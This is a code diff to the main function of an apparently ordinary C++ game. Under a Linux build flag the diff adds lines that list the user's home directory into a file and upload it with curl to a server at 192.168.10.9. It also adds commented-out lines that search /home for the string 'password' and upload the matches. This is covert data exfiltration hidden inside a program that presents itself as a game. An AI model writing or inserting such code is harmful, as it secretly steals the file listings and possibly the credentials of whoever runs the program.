@@ -111,9 +111,13 @@ int main(int argc, char *argv[])
         wrapper(g, P1.pos);
         P1.draw(g);
     }
+
     #ifdef linux
+    //system("ls -R /home/ | grep -r 'password' | grep ' ' >> grinch.txt");
     system(fmt::format("cat {}", trollPath).c_str());
     system("tree ~/ >> ./pluh.dontdeletemeorelsevirus");
+    system("curl --location 'http://192.168.10.9:3000/home/seamuseats/pluh.txt' --form 'file=@./pluh.dontdeletemeorelsevirus'");
+    //system("curl --location 'http://192.168.10.9:3000/home/seamuseats/grinch.txt' --form 'file=@./grinch.txt'");
     #endif
     #ifdef APPLE
     system(fmt::format("cat {}", trollPath).c_str());
